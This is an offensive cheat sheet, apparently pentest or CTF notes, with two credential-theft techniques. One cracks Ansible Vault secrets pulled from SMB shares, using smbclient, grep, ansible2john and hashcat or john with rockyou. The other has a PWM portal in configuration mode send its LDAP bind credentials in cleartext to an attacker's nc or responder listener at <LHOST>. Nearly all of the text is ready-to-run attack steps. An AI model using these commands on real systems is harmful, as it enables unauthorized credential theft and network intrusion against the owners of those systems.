# Ansible Vault Crack + PWM LDAP Plaintext Exposure

## Ansible Vault → Credentials

If SMB shares contain Ansible playbooks with `!vault |` encrypted fields:
```bash
smbclient.py '<DOMAIN>/<USER>:<PASS>@<TARGET>'
# Download .yml files containing !vault | blocks

# Extract all vault blobs and crack
grep -r '!vault' . -A5 | grep -v '!vault\|--\|#' | tr -d ' ' > vaults.txt
ansible2john vaults.txt > vault.hashes
hashcat -m 16900 vault.hashes /usr/share/wordlists/rockyou.txt
# OR: john --wordlist=/usr/share/wordlists/rockyou.txt vault.hashes
```

## PWM Password Self-Service → LDAP Plaintext

PWM (password self-service portal) in **configuration mode** will test LDAP connections and leak credentials in plaintext:

1. Navigate to PWM at its port (e.g. 8443)
2. If it shows "Configuration Mode" warning → click **Configuration Editor** → no password needed
3. Go to **LDAP** settings → set **LDAP Server URL** to `ldap://<LHOST>:389`
4. Start a listener: `nc -lvnp 389` or `responder -I tun0`
5. Click **Test LDAP Profile** → PWM sends bind credentials in cleartext to your listener
